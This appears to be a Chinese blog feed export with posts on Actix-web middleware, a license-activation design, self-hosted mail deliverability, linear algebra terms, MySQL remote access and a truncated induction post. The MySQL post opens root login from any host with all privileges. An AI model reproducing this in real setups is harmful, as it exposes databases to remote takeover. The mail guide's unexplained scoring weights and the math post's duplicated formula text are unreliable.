<p><code>req</code> 是传入的请求，它是一个 <code>ServiceRequest</code> 类型的值，表示需要处理的 HTTP 请求</p>
<p><strong><code>println!(&quot;Hi! Handling a request!&quot;)</code></strong> 这一行会在每次请求被中间件处理时输出 “Hi! Handling a request!”，表示中间件正在处理请求。这个可以作为日志记录，帮助你跟踪请求的流转。</p>
<p>最后，<code>self.service.call(req)</code> 调用下游服务的 <code>call</code> 方法，把请求传递给下游服务进行处理。下游服务通常会返回一个 <code>ServiceResponse</code> 类型的响应</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span></span><br><span class="line">    S: Service&lt;ServiceRequest, Response = ServiceResponse&lt;B&gt;, Error = Error&gt;,</span><br><span class="line">    S::Future: <span class="symbol">&#x27;static</span>,</span><br><span class="line">    B: <span class="symbol">&#x27;static</span>,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Response</span> = ServiceResponse&lt;B&gt;;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Error</span> = Error;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Future</span> = LocalBoxFuture&lt;<span class="symbol">&#x27;static</span>, <span class="type">Result</span>&lt;<span class="keyword">Self</span>::Response, <span class="keyword">Self</span>::Error&gt;&gt;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">call</span>(&amp;<span class="keyword">self</span>, req: ServiceRequest) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>::Future &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hi from start. You requested: &#123;&#125;&quot;</span>, req.<span class="title function_ invoke__">path</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">fut</span> = <span class="keyword">self</span>.service.<span class="title function_ invoke__">call</span>(req);</span><br><span class="line"></span><br><span class="line">    <span class="type">Box</span>::<span class="title function_ invoke__">pin</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">res</span> = fut.<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Hi from response&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(res)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="简易的中间件"><a href="#简易的中间件" class="headerlink" title="简易的中间件"></a>简易的中间件</h3><p>适用于小型任务</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">my_middleware</span>(</span><br><span class="line">    req: ServiceRequest, </span><br><span class="line">    <span class="comment">// req 是一个 ServiceRequest 类型的参数，表示传入的 HTTP 请求 </span></span><br><span class="line">    <span class="comment">// ServiceRequest 包含请求的详细信息，像是头部、路径、查询参数等。</span></span><br><span class="line">    next: Next&lt;<span class="keyword">impl</span> <span class="title class_">MessageBody</span>&gt;,</span><br><span class="line">    <span class="comment">// next 是一个函数，表示下一个中间件或请求处理器。Next 类型包含一个闭包，</span></span><br><span class="line">    <span class="comment">// 调用这个闭包可以传递请求到下一个中间件或最终的请求处理器</span></span><br><span class="line"></span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;ServiceResponse&lt;<span class="keyword">impl</span> <span class="title class_">MessageBody</span>&gt;, Error&gt; &#123;</span><br><span class="line">    <span class="comment">// 这是函数的返回类型。它返回一个 Result，表示异步调用可能会成功或者失败</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写 预处理代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    next.<span class="title function_ invoke__">call</span>(req).<span class="keyword">await</span> <span class="comment">// 异步调用</span></span><br><span class="line">    <span class="comment">// 即将请求传递到下一个中间件或最终的处理函数。如果这是最后一个中间件，最终的请求处理函数（例如控制器）将会执行。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// post-processing</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 会等待请求的处理结果，即调用下一个中间件或者最终的请求处理器，并等待它返回一个响应。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Nuxt.js</tag>
        <tag>JavaScript</tag>
        <tag>TypeScript</tag>
        <tag>Rust</tag>
        <tag>Actix</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-16-会员激活方案</title>
    <url>/2025/02/06/2025-2-16-%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h3 id="会员激活与鉴权方案"><a href="#会员激活与鉴权方案" class="headerlink" title="会员激活与鉴权方案"></a><strong>会员激活与鉴权方案</strong></h3><p><strong>设计原则</strong>：去中心化信任验证 + 动态设备绑定 + 分层安全防护</p>
<hr>
<h3 id="一、密钥与加密体系设计"><a href="#一、密钥与加密体系设计" class="headerlink" title="一、密钥与加密体系设计"></a><strong>一、密钥与加密体系设计</strong></h3><ol>
<li><strong>密钥生成与分发</strong><ul>
<li><strong>服务端</strong><ul>
<li>使用RSA 3072生成非对称密钥对，私钥仅存于服务端硬件安全模块（HSM）。</li>
<li>序列号生成规则：<code>[产品码(4位)] + [日期(8位)] + HMAC-SHA256(设备ID+随机数)</code>，确保唯一性。</li>
</ul>
</li>
<li><strong>客户端</strong><ul>
<li>内置公钥（混淆后存储），用于验证服务端签名。</li>
</ul>
</li>
</ul>
</li>
<li><strong>动态密钥绑定</strong><ul>
<li>激活时强制绑定设备唯一指纹（如Android的<code>Attestation Key</code>、iOS的<code>DeviceCheck Token</code>或TEE生成的硬件哈希）。</li>
<li>同一密钥仅允许激活1台设备，重复激活触发风控审核。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="二、激活流程（强制在线校验）"><a href="#二、激活流程（强制在线校验）" class="headerlink" title="二、激活流程（强制在线校验）"></a><strong>二、激活流程（强制在线校验）</strong></h3><ol>
<li><p><strong>客户端请求激活</strong></p>
<ul>
<li><p>用户输入序列号后，客户端采集设备指纹（非MAC&#x2F;IP）并签名，发送至服务端。</p>
</li>
<li><p>请求参数：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">  <span class="attr">&quot;serial_number&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ABCD-1234-EFGH&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">  <span class="attr">&quot;device_fingerprint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;TEE签名后的硬件哈希&gt;&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;服务端预下发的一次性随机数&gt;&quot;</span>  </span><br><span class="line"><span class="punctuation">&#125;</span>  </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>服务端鉴权与响应</strong></p>
<ul>
<li><p>校验序列号有效性、设备指纹合法性、Nonce是否匹配。</p>
</li>
<li><p>通过后生成激活凭证：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">  <span class="attr">&quot;expire_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;到期时间戳&gt;&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">  <span class="attr">&quot;license_data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;功能权限代码&gt;&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;RSA私钥签名的(expire_time+license_data+nonce)&gt;&quot;</span>  </span><br><span class="line"><span class="punctuation">&#125;</span>  </span><br></pre></td></tr></table></figure>
</li>
<li><p>响应数据通过TLS 1.3加密通道返回。</p>
</li>
</ul>
</li>
<li><p><strong>客户端激活验证</strong></p>
<ul>
<li>使用公钥验证签名，确认数据未被篡改。</li>
<li>校验<code>expire_time</code>是否与服务端时间同步（需客户端发起NTP校时请求）。</li>
<li>验证通过后，将<code>license_data</code>写入安全存储区（如Android KeyStore&#x2F;iOS Secure Enclave）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="三、安全防护机制"><a href="#三、安全防护机制" class="headerlink" title="三、安全防护机制"></a><strong>三、安全防护机制</strong></h3><ol>
<li><strong>防篡改与重放攻击</strong><ul>
<li><strong>时效性控制</strong>：激活凭证有效期5分钟，超时需重新请求。</li>
<li><strong>Nonce校验</strong>：每个Nonce仅允许使用一次，服务端缓存已用Nonce 24小时。</li>
</ul>
</li>
<li><strong>设备指纹替代MAC&#x2F;IP</strong><ul>
<li><strong>可信标识</strong>：<ul>
<li>Android：通过<code>SafetyNet Attestation</code>获取硬件背书证明。</li>
<li>iOS：通过<code>DeviceCheck API</code>获取Apple验证的设备标识。</li>
</ul>
</li>
<li><strong>环境检测</strong>：激活前检查设备是否越狱&#x2F;root，拒绝高风险环境。</li>
</ul>
</li>
<li><strong>分层拉黑与风控</strong><ul>
<li><strong>一级拉黑（账户）</strong>：单设备多次输入错误密钥，限制账户激活权限。</li>
<li><strong>二级拉黑（设备）</strong>：检测到伪造设备指纹，封禁硬件标识。</li>
<li><strong>三级拉黑（网络）</strong>：高频攻击IP触发临时IP封锁，结合CAPTCHA验证。</li>
</ul>
</li>
<li><strong>服务端安全增强</strong><ul>
<li><strong>密钥隔离</strong>：私钥存储在HSM或KMS中，禁止明文导出。</li>
<li><strong>行为分析</strong>：实时监控同一密钥的激活地理位置、设备类型突变等异常。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="四、隐私与合规设计"><a href="#四、隐私与合规设计" class="headerlink" title="四、隐私与合规设计"></a><strong>四、隐私与合规设计</strong></h3><ol>
<li><strong>数据最小化原则</strong><ul>
<li>不收集MAC&#x2F;IP，仅使用系统提供的匿名设备标识。</li>
<li>用户账户名脱敏处理（如仅记录哈希值）。</li>
</ul>
</li>
<li><strong>合规声明</strong><ul>
<li>隐私政策明确说明数据用途（如“用于防止账号滥用”）。</li>
<li>GDPR&#x2F;CCPA合规：支持用户导出&#x2F;删除设备绑定信息。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="五、容灾与降级方案"><a href="#五、容灾与降级方案" class="headerlink" title="五、容灾与降级方案"></a><strong>五、容灾与降级方案</strong></h3><ol>
<li><strong>服务端不可用处理</strong><ul>
<li>客户端缓存最后一次合法激活凭证，允许离线验证（有效期最长24小时）。</li>
<li>超时后需重新在线校验。</li>
</ul>
</li>
<li><strong>密钥吊销机制</strong><ul>
<li>服务端维护吊销列表（CRL），客户端定期同步并拒绝已吊销密钥。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="六、技术验证方案"><a href="#六、技术验证方案" class="headerlink" title="六、技术验证方案"></a><strong>六、技术验证方案</strong></h3><ol>
<li><strong>渗透测试用例</strong><ul>
<li>模拟重放攻击、时间篡改、设备指纹伪造等场景。</li>
</ul>
</li>
<li><strong>自动化攻防验证</strong><ul>
<li>使用Burp Suite测试API接口安全性，确保无SQL注入&#x2F;JWT篡改漏洞。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>新版方案通过 <strong>硬件级信任链</strong>（TEE&#x2F;SE）、<strong>动态凭证绑定</strong>、<strong>分层风控</strong> 三重防护，解决原方案的密钥泄露、时间篡改、设备伪造等核心问题。安全性对标DRM方案（如Widevine L1），同时满足隐私合规要求。关键依赖：<strong>服务端HSM</strong> + <strong>客户端TEE环境检测</strong>。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-16-企业邮箱自建</title>
    <url>/2025/02/06/2025-2-16-%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1%E8%87%AA%E5%BB%BA/</url>
    <content><![CDATA[<p>以下是提高企业邮箱 <strong>mail-tester 评分</strong>及解决自建邮局核心问题的完整方案：</p>
<hr>
<h3 id="一、mail-tester-评分提升策略（核心项）"><a href="#一、mail-tester-评分提升策略（核心项）" class="headerlink" title="一、mail-tester 评分提升策略（核心项）"></a><strong>一、mail-tester 评分提升策略（核心项）</strong></h3><h4 id="1-基础身份认证（权重40-）"><a href="#1-基础身份认证（权重40-）" class="headerlink" title="1. 基础身份认证（权重40%）"></a><strong>1. 基础身份认证（权重40%）</strong></h4><ul>
<li><p><strong>SPF 记录</strong></p>
<p>txt</p>
<p>复制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v=spf1 mx ip4:你的服务器IP地址 include:_spf.google.com ~all</span><br></pre></td></tr></table></figure>

<ul>
<li>确保包含所有发信IP（如邮件服务器、第三方服务商），禁止使用<code>+all</code>。</li>
</ul>
</li>
<li><p><strong>DKIM 签名</strong></p>
<ul>
<li>生成2048位密钥对，在DNS添加<code>selector._domainkey</code>记录（如 <code>default._domainkey</code>），确保邮件头包含有效签名。</li>
</ul>
</li>
<li><p><strong>DMARC 策略</strong></p>
<p>txt</p>
<p>复制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v=DMARC1; p=quarantine; rua=mailto:dmarc@yourdomain.com; ruf=mailto:forensic@yourdomain.com; pct=100</span><br></pre></td></tr></table></figure>

<ul>
<li>初期使用<code>p=none</code>监控，稳定后升级为<code>p=quarantine</code>或<code>p=reject</code>。</li>
</ul>
</li>
</ul>
<h4 id="2-反向DNS（PTR记录）"><a href="#2-反向DNS（PTR记录）" class="headerlink" title="2. 反向DNS（PTR记录）"></a><strong>2. 反向DNS（PTR记录）</strong></h4><ul>
<li>要求ISP为邮件服务器IP设置反向解析，确保<code>IP → mail.yourdomain.com → 原IP</code>双向一致。</li>
</ul>
<h4 id="3-邮件内容优化（权重30-）"><a href="#3-邮件内容优化（权重30-）" class="headerlink" title="3. 邮件内容优化（权重30%）"></a><strong>3. 邮件内容优化（权重30%）</strong></h4><ul>
<li><strong>HTML规范</strong><ul>
<li>代码压缩至最小化，移除JavaScript和外部CSS。</li>
<li>文字与图片比例建议≥6:4，避免纯图片邮件。</li>
</ul>
</li>
<li><strong>文本兼容性</strong><ul>
<li>必须提供纯文本版本（text&#x2F;plain），内容与HTML版本一致。</li>
</ul>
</li>
<li><strong>垃圾词过滤</strong><ul>
<li>避免使用”Free””Winner””Urgent”等高频垃圾邮件关键词。</li>
</ul>
</li>
</ul>
<h4 id="4-基础设施优化（权重20-）"><a href="#4-基础设施优化（权重20-）" class="headerlink" title="4. 基础设施优化（权重20%）"></a><strong>4. 基础设施优化（权重20%）</strong></h4><ul>
<li><strong>独立IP池</strong><ul>
<li>专用IP仅用于企业邮局，不与Web服务共享。</li>
<li>预热新IP：首周每天发送量≤100封，逐步提升。</li>
</ul>
</li>
<li><strong>TLS加密</strong><ul>
<li>强制启用TLS 1.2+，禁用SSLv3，使用Let’s Encrypt证书。</li>
</ul>
</li>
</ul>
<h4 id="5-发信行为管理（权重10-）"><a href="#5-发信行为管理（权重10-）" class="headerlink" title="5. 发信行为管理（权重10%）"></a><strong>5. 发信行为管理（权重10%）</strong></h4><ul>
<li><strong>发送频率限制</strong><ul>
<li>单IP每小时发信量≤500封，突发流量需平滑控制。</li>
</ul>
</li>
<li><strong>收件人验证</strong><ul>
<li>实现实时RBL（如Spamhaus）校验，拦截无效&#x2F;高风险地址。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="二、其他关键问题及解决方案"><a href="#二、其他关键问题及解决方案" class="headerlink" title="二、其他关键问题及解决方案"></a><strong>二、其他关键问题及解决方案</strong></h3><h4 id="1-邮件服务器黑名单风险"><a href="#1-邮件服务器黑名单风险" class="headerlink" title="1. 邮件服务器黑名单风险"></a><strong>1. 邮件服务器黑名单风险</strong></h4><ul>
<li><strong>实时监控工具</strong><ul>
<li>部署Mxtoolbox&#x2F;Spamhaus API，自动检测IP是否进入SBL&#x2F;XBL。</li>
<li>被列黑时，立即通过https:&#x2F;&#x2F;www.spamhaus.org&#x2F;lookup&#x2F; 提交移除请求。</li>
</ul>
</li>
</ul>
<h4 id="2-合规与隐私"><a href="#2-合规与隐私" class="headerlink" title="2. 合规与隐私"></a><strong>2. 合规与隐私</strong></h4><ul>
<li><strong>GDPR合规</strong><ul>
<li>邮件页脚强制包含：<strong>公司注册地址+退订链接（1-click unsubscribe）</strong>。</li>
<li>用户数据存储加密，保留日志≤6个月。</li>
</ul>
</li>
</ul>
<h4 id="3-垃圾邮件陷阱（Spam-Trap）"><a href="#3-垃圾邮件陷阱（Spam-Trap）" class="headerlink" title="3. 垃圾邮件陷阱（Spam Trap）"></a><strong>3. 垃圾邮件陷阱（Spam Trap）</strong></h4><ul>
<li><strong>清洗邮件列表</strong><ul>
<li>使用ZeroBounce或Hunter.io验证地址有效性，剔除：<ul>
<li>无效域名（如<code>user@example.com</code>）</li>
<li>长期未活跃账户（≥1年未打开邮件）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-邮件服务器安全"><a href="#4-邮件服务器安全" class="headerlink" title="4. 邮件服务器安全"></a><strong>4. 邮件服务器安全</strong></h4><ul>
<li><p><strong>防开放中继</strong></p>
<ul>
<li><p>配置Postfix&#x2F;Sendmail仅允许认证用户发信：</p>
<p>bash</p>
<p>复制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>暴力破解防护</strong></p>
<ul>
<li>Fail2ban规则：1小时内5次密码错误封禁IP 24小时。</li>
</ul>
</li>
</ul>
<h4 id="5-送达率监控"><a href="#5-送达率监控" class="headerlink" title="5. 送达率监控"></a><strong>5. 送达率监控</strong></h4><ul>
<li><strong>专业工具</strong><ul>
<li>使用Mailgenomics&#x2F;GlockApps模拟多ISP（Gmail、Outlook、Yahoo）投递测试。</li>
<li>监控指标：进箱率（≥95%）、垃圾率（≤0.5%）、退信率（≤1%）。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="三、高评分配置示例"><a href="#三、高评分配置示例" class="headerlink" title="三、高评分配置示例"></a><strong>三、高评分配置示例</strong></h3><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># DNS记录</span><br><span class="line">@            <span class="keyword">MX</span>    <span class="number">10</span> mail.yourdomain.com.</span><br><span class="line">mail         <span class="keyword">A</span>     [Your Server IP]</span><br><span class="line">_dmarc       <span class="keyword">TXT</span>   &quot;v=DMARC1<span class="comment">; p=none; rua=mailto:dmarc@yourdomain.com&quot;</span></span><br><span class="line">default._domainkey  <span class="keyword">TXT</span>  &quot;v=DKIM1<span class="comment">; k=rsa; p=MIIBIjANBgkqhkiG...（公钥内容）&quot;</span></span><br><span class="line">@            <span class="keyword">TXT</span>   &quot;v=spf1 mx ip<span class="number">4:12.34.56</span>.<span class="number">78</span> include:spf.protection.outlook.com -all&quot;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="四、极端场景应对"><a href="#四、极端场景应对" class="headerlink" title="四、极端场景应对"></a><strong>四、极端场景应对</strong></h3><ol>
<li><strong>IP被大规模封禁</strong> <ul>
<li>启用备用IP并限流，通过第三方中继服务（如Mailgun）临时发信。</li>
</ul>
</li>
<li><strong>钓鱼邮件仿冒</strong><ul>
<li>配置BIMI（Brand Indicators for Message Identification） + VMC（Verified Mark Certificate）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>通过 <strong>三重认证（SPF+DKIM+DMARC）</strong> + <strong>反向DNS</strong> + <strong>内容合规</strong> 可确保mail-tester评分≥9&#x2F;10。同时需长期监控IP信誉、清洗名单、防御攻击，才能维持高送达率。建议使用PowerMTA或Amazon SES替代自建方案以降低运维成本。</p>
]]></content>
      <tags>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-27-数学的基本名词及其解释（一）</title>
    <url>/2025/02/27/2025-2-27-%E6%95%B0%E5%AD%A6%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%90%8D%E8%AF%8D%E5%8F%8A%E5%85%B6%E8%A7%A3%E9%87%8A%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h3 id="数学的基本名词及其解释（一）"><a href="#数学的基本名词及其解释（一）" class="headerlink" title="数学的基本名词及其解释（一）"></a>数学的基本名词及其解释（一）</h3><h4 id="1-向量（Vector）"><a href="#1-向量（Vector）" class="headerlink" title="1. 向量（Vector）"></a>1. <strong>向量（Vector）</strong></h4><ul>
<li><strong>别称</strong>：矢量、欧几里得向量（Euclidean vector）</li>
<li><strong>定义</strong>：<ul>
<li>具有<strong>大小</strong>（模长）和<strong>方向</strong>的几何对象，满足<strong>平行四边形法则</strong>（向量加法）和<strong>标量乘法</strong>的封闭性。</li>
<li>在坐标系中可表示为有序数组（如 v&#x3D;(v1,v2,…,vn)v&#x3D;(v1,v2,…,vn)），称为<strong>分量形式</strong>。</li>
</ul>
</li>
<li><strong>核心性质</strong>：线性组合、线性无关性、基底表示。</li>
</ul>
<hr>
<h4 id="2-向量空间（Vector-Space）"><a href="#2-向量空间（Vector-Space）" class="headerlink" title="2. 向量空间（Vector Space）"></a>2. <strong>向量空间（Vector Space）</strong></h4><ul>
<li><strong>别称</strong>：线性空间</li>
<li><strong>定义</strong>：<ul>
<li>一个非空集合 VV，其元素（向量）满足以下两种运算的封闭性：<ol>
<li><strong>加法</strong>：u+v∈Vu+v∈V</li>
<li><strong>标量乘法</strong>：cv∈Vcv∈V（cc 为标量，如实数或复数）</li>
</ol>
</li>
<li>必须满足<strong>八大公理</strong>（如交换律、结合律、零向量存在性等）。</li>
</ul>
</li>
<li><strong>示例</strong>：<ul>
<li>RnRn（n维实向量空间）、多项式空间、函数空间。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-分量数组（Component-Array）"><a href="#3-分量数组（Component-Array）" class="headerlink" title="3. 分量数组（Component Array）"></a>3. <strong>分量数组（Component Array）</strong></h4><ul>
<li><strong>定义</strong>：向量在特定基底下的坐标表示。</li>
<li><strong>示例</strong>：向量 v&#x3D;(3,−2,5)v&#x3D;(3,−2,5) 在三维空间中表示其在标准基底下的三个分量。</li>
</ul>
<hr>
<h4 id="4-抽象线性空间（Abstract-Linear-Space）"><a href="#4-抽象线性空间（Abstract-Linear-Space）" class="headerlink" title="4. 抽象线性空间（Abstract Linear Space）"></a>4. <strong>抽象线性空间（Abstract Linear Space）</strong></h4><ul>
<li><strong>定义</strong>：<ul>
<li>不局限于几何向量的向量空间，可以是满足线性公理的任意集合（如矩阵、多项式、函数）。</li>
<li>核心思想：通过公理化定义，推广线性结构的数学对象。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="5-维度（Dimension）"><a href="#5-维度（Dimension）" class="headerlink" title="5. 维度（Dimension）"></a>5. <strong>维度（Dimension）</strong></h4><ul>
<li><strong>定义</strong>：向量空间中<strong>基底</strong>的向量个数。</li>
<li><strong>性质</strong>：<ul>
<li>有限维空间：维度为 nn（如 R3R3 的维度为3）。</li>
<li>无限维空间：基底包含无限个向量（如多项式空间 R[x]R[x]）。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="6-n阶线性常微分方程"><a href="#6-n阶线性常微分方程" class="headerlink" title="6. n阶线性常微分方程"></a>6. <strong>n阶线性常微分方程</strong></h4><ul>
<li><p><strong>定义</strong>：形如</p>
<p>y(n)+an−1(x)y(n−1)+⋯+a1(x)y′+a0(x)y&#x3D;f(x)y(n)+an−1(x)y(n−1)+⋯+a1(x)y′+a0(x)y&#x3D;f(x)</p>
<p>的微分方程，其解空间是维度为 nn 的向量空间。</p>
</li>
</ul>
<hr>
<h4 id="7-有限维与无限维空间"><a href="#7-有限维与无限维空间" class="headerlink" title="7. 有限维与无限维空间"></a>7. <strong>有限维与无限维空间</strong></h4><ul>
<li><strong>有限维空间</strong>：存在有限个向量构成的基底（如 RnRn）。</li>
<li><strong>无限维空间</strong>：基底需无限个向量生成（如连续函数空间 C([a,b])C([a,b])）。</li>
</ul>
<hr>
<h4 id="8-形式描述（Formal-Description）"><a href="#8-形式描述（Formal-Description）" class="headerlink" title="8. 形式描述（Formal Description）"></a>8. <strong>形式描述（Formal Description）</strong></h4><ul>
<li><p><strong>定义</strong>：用严格的数学符号与公理定义概念。</p>
</li>
<li><p><strong>示例</strong>：向量空间公理可形式化为：</p>
<p>∀u,v∈V,∀c∈R,u+v∈V,cu∈V.∀u,v∈V,∀c∈R,u+v∈V,cu∈V.</p>
</li>
</ul>
<hr>
<h4 id="9-量子空间（Quantum-Space）"><a href="#9-量子空间（Quantum-Space）" class="headerlink" title="9. 量子空间（Quantum Space）"></a>9. <strong>量子空间（Quantum Space）</strong></h4><ul>
<li><strong>定义</strong>：量子力学中描述粒子状态的<strong>希尔伯特空间</strong>（Hilbert Space），是无限维内积空间，满足完备性。</li>
<li><strong>特点</strong>：波函数（量子态）是该空间中的向量。</li>
</ul>
<hr>
<h4 id="10-构建复杂结构"><a href="#10-构建复杂结构" class="headerlink" title="10. 构建复杂结构"></a>10. <strong>构建复杂结构</strong></h4><ul>
<li><strong>方法</strong>：通过向量空间的<strong>直和</strong>、<strong>张量积</strong>、<strong>商空间</strong>等操作生成更高阶结构。</li>
<li><strong>应用</strong>：几何、物理学（如广义相对论中的流形）。</li>
</ul>
<hr>
<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><ul>
<li><strong>浪漫式、哥特式和巴洛克式的元素</strong>：此描述可能为比喻，强调数学结构的多样性与复杂性，类似于建筑风格的融合。数学中不同分支（如代数、几何、分析）的“风格”相互交织，形成统一的理论框架。</li>
<li><strong>基本构建块</strong>：通常指向量空间的<strong>基底</strong>，通过线性组合生成整个空间。</li>
</ul>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从向量到抽象空间，数学通过公理化与形式化构建了描述现实与抽象世界的语言。有限维与无限维的划分、线性与非线性结构的对比，体现了数学从具体到一般、从直观到抽象的深刻统一性。</p>
]]></content>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-26-ubuntu部署mysql流程并配置远程登陆</title>
    <url>/2025/02/26/2025-2-26-ubuntu%E9%83%A8%E7%BD%B2mysql%E6%B5%81%E7%A8%8B%E5%B9%B6%E9%85%8D%E7%BD%AE%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86/</url>
    <content><![CDATA[<h1 id="2025-2-26-ubuntu部署mysql流程并配置远程登陆"><a href="#2025-2-26-ubuntu部署mysql流程并配置远程登陆" class="headerlink" title="2025-2-26 ubuntu部署mysql流程并配置远程登陆"></a>2025-2-26 ubuntu部署mysql流程并配置远程登陆</h1><p>先登录，默认无密码登录，但是需要root权限所以我们使用sudo</p>
<ul>
<li><code>sudo mysql -u root -p</code> 登录</li>
</ul>
<p>进入mysql命令行，我们知道mysql的用户密码都存在表名为mysql的表中</p>
<ul>
<li><code>&gt; use mysql </code>   进入表</li>
</ul>
<p>下一步修改root用户，让其允许任何IP进行连接</p>
<ul>
<li><code>update user set host=&#39;%&#39; where user=&#39;root&#39;;</code></li>
</ul>
<p>授予了 <code>root</code> 用户从任何主机（<code>%</code>）访问数据库的所有权限</p>
<ul>
<li><code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39;;</code></li>
</ul>
<p>设置一个密码</p>
<ul>
<li><pre><code>ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;your mysql_native_password&#39;;
</code></pre>
</li>
</ul>
<p>刷新权限</p>
<ul>
<li><p><code>FLUSH PRIVILEGES;</code></p>
</li>
<li><p>修改bind ip 为 0.0.0.0即可</p>
</li>
<li><p>Tip: mysql高版本部署后不要去修改 &#x2F;etc&#x2F;mysql&#x2F;my.cnf 和 其中推荐你去配置的文件，监听IP等选项在&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf中</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>SQL</tag>
        <tag>运维</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-28-数学归纳法学习</title>
    <url>/2025/02/28/2025-2-28-%E6%95%B0%E5%AD%A6%E5%BD%92%E7%BA%B3%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h3><p>Mathematical Induction ,MI 是一种数学证明方法</p>
<ul>
<li>作用：证明某个给定命题在整个（或局部）自然数范围内成立。</li>
<li>广义：用于证明一般良基结构。</li>
<li>Example: 集合论中的树</li>
<li>Alias: 结构归纳法</li>
<li>数论中：以一种不同的方式来证明任意一个给定的情形都是正确的。</li>
<li>Tips: 数学归纳法不是非严谨的归纳推理法，属于严谨的演绎推理法。</li>
<li>Tips: 所有数学证明都是演绎法。</li>
</ul>
<hr>
<h4 id="合理性"><a href="#合理性" class="headerlink" title="合理性"></a>合理性</h4><ul>
<li><p>数学归纳法的原理，通常被规定作为自然数公理（参见皮亚诺公理）。但是在另一些公理的基础上，它可以用一些逻辑方法证明。</p>
</li>
<li><p>良序性质（最小自然数公理）推出数学归纳法：</p>
<ul>
<li><p>条件1：自然数集是良序的。</p>
</li>
<li><p>Example: {1,2,3,4,5} 最小数1</p>
</li>
